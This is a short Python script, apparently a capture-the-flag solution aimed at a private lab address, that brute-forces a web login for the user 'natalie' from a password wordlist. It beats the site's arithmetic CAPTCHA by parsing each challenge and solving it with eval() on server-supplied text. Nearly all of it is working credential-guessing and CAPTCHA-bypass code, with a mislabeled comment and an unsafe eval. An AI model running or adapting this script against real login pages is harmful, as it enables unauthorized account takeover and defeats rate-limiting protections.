import requests
import re

url = 'http://10.10.71.75/login' # replace with the URL of the login page

with open('passwords.txt', 'r') as pf:
        for password in pf:
            username = "natalie" # The password you obtained from username script
            password = password.strip()
            
            payload = {
                "username" : username,
                "password" : password
            }


            response = requests.post(url, data=payload)
            
            # Send the GET request and extract the CAPTCHA string if present
            captcha_match = re.search(r'\d+\s*[-+/*]\s*\d+\s*=\s*\?',response.text)
            print(captcha_match)
            captcha_text = ''
            if captcha_match is not None:
                captcha_text = captcha_match.group(0).replace('=', '').strip()
                print("CAPTCHA text:", captcha_text)

                # Solve the CAPTCHA and include the solution in the payload
                # num1, operator, num2 = re.findall('\d+|\D+', captcha_text)
                match = re.search(r'(\d+)\s*([-+/*]?)\s*(\d+)', captcha_text)
                if match:
                    num1, operator, num2 = match.groups()
                    solution = eval(num1 + operator + num2)
                    print("Solution:", solution)
                    payload = {
                        'username': username,
                        'password': password,
                        'captcha': solution
                    }
                else:
                    print("Error: Failed to extract numbers and operator from CAPTCHA text")
                    payload = None
            else:
                print("No CAPTCHA found on the page")
                payload = {
                    'username': username,
                    'password': password
                }

            # Send the POST request with the payload if it is not None
            if payload is not None:
                response = requests.post(url, data=payload)
                if "Too many bad login attempts!" in response.text:
                    print(f"Attempted login with username as: {username} and password as: {password}")
                else:
                    print(f"The correct username is: {username} and password is: {password}")
                    exit()
            else:
                print("Empty payload, cannot send request")
